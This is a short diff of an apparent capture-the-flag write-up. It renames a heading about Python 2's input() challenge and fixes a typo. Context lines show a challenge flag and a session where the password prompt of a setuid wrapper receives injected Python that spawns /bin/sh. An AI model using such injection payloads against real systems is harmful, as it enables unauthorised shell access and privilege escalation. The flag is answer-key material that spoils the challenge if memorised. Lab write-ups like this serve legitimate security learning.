@@ -175,7 +175,7 @@ PerlCanDoBetterThanYouThink
 ```
 Flag is : ```PerlCanDoBetterThanYouThink```
 
-#python - exploit me 1
+# Python - input()
 Source :
 ```python
 #!/usr/bin/python2
@@ -216,7 +216,7 @@ while true; do
 done
 
 ```
-but it seemed like it will take forever so it exploited it.
+but it seemed like it will take forever so i exploited it.
 ```assembly
 app-script-ch6@challenge02:~$ ./setuid-wrapper 
 Please enter password : __import__("os").execl("/bin/sh","sh")
